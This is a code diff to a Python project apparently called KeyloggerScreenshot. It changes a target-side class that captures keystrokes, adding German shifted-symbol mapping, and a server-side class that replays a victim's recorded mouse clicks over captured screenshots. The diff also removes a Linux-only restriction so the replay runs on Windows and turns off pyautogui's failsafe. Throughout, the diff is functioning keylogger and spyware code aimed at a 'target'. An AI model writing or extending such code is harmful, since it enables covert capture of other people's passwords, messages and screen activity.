@@ -197,7 +197,10 @@ class KeyloggerTarget:
     def on_press(self, key):
         try:
             try:
-                if self.caps is True: word = key.char.upper()
+                other_charecters = {"1": "!", "2": '"', "3": "§", "4": "$", "5": "%", "6": "&", "7": "/", "8": "(", "9": ")", "0": "=", "ß": "?"}
+                if self.caps is True:
+                    if key.char in other_charecters: word = other_charecters[key.char]
+                    else: word = key.char.upper()
                 else: word = key.char
 
                 print(f'Alphabetische Taste wurde gedrückt: {word} ')
@@ -294,8 +297,12 @@ class ServerKeylogger:
         real_sec = seconds
         seconds = seconds + 4
         #Plus four seconds because of the time the code sleeps
+        
+        if sys.platform == "linux": size = "295x367"
+        else: size = "250x415"
+
         tkWindow = tk.Tk()
-        tkWindow.geometry('295x367')
+        tkWindow.geometry(size)
         tkWindow.title('KeyloggerScreenshot')
         minutes = seconds // 60
         this_min = minutes * 60
@@ -404,11 +411,6 @@ class ServerKeylogger:
                     print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                     sys.exit()
 
-                if sys.platform != "linux":
-                    print("\nThis simulation is only availible on linux. The Windows version is coming soon")
-                    print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
-                    sys.exit()
-
                 mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
                 #Looks for coordinates in mouseInfoLog
 
@@ -433,16 +435,20 @@ class ServerKeylogger:
                     print('There is no "New_Image" in this directory')
                     sys.exit()
 
+                pg.FAILSAFE = False
+                # This is for the corner allowance
+                img_seconds = 5.572
+                # This is the speed it takes to open the image
                 speed = 0.47
-                #This is the time each coordinate needs
+                # This is the time each coordinate needs
                 sleep = 1.5
-                #This is the time where the code is taking a time out
+                # This is the time where the code is taking a time out
                 one_coordinate = speed + sleep
 
                 duration_seconds = one_coordinate * len(every_coordinate)
-                summed_up = duration_seconds * len(img_files) + 2 * len(img_files)
+                one_image = duration_seconds + img_seconds
+                summed_up = one_image * len(img_files)
                 seconds = round(summed_up)
-                #This calculates the amount it will take
 
                 print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
                 threading_count = threading.Thread(target=self.countdown)
@@ -455,14 +461,12 @@ class ServerKeylogger:
                     #Opens the image
                     im.show()
                     time.sleep(2)
-                    fullscreen = pg.locateCenterOnScreen("fullscreen.png")
-                    #Makes the image in the perfect resolution
-                    if fullscreen:
-                        pg.click(fullscreen)
-                        for x, y in every_coordinate:
-                            pg.moveTo(x, y, 0.3)
-                            time.sleep(sleep)
-                        pg.press("esc")
+                    pg.press("f11")
+                    # Makes the image in the perfect resolution
+                    for x, y in every_coordinate:
+                        pg.moveTo(x, y, 0.3)
+                        time.sleep(sleep)
+                    pg.press("esc")
 
         except OSError:
             raise OSError("Change the port number to run without an error")
